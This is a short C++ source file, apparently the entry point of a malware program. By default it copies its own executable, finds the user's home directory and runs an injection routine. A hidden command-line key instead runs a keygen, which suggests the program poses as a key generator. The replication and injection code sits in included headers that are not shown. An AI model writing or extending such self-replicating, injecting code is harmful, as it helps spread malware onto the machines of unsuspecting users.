//
// Created by ferdinand on 8/12/25.
//

#include <iostream>

#include "injector.h"
#include "keygen.h"
#include "replicator.h"

int main(int argc, char** argv) CAREANDBARE(
{
    bool isInjector = true;

    for (int i = 1; i < argc; i++) {
        if (argv[i] == noninjectKey) isInjector = false;
    }

    getHomePath();

    if (isInjector) {
        replicate(argv[0]);
        inject();
    }
    else {
        procKeygen();
    }
    return 0;
}
)
